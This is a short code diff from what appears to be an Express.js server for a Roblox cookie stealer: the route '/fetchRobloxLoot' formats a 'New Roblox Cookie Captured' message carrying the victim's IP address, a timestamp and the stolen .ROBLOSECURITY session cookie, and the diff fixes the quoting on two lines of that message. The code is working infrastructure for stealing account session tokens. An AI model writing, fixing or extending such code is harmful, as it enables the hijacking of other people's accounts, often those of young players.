@@ -26,8 +26,8 @@ app.get("/fetchRobloxLoot", async (req, res) => {
     const content = [
       "🔑 New Roblox Cookie Captured",
       "",
-      📡 IP Address: ${ip || "Unknown"},
-      🕓 Time: ${now},
+      '📡 IP Address: ${ip || "Unknown"}',
+      '🕓 Time: ${now}',
       "",
       "🧩 .ROBLOSECURITY:",
       "",
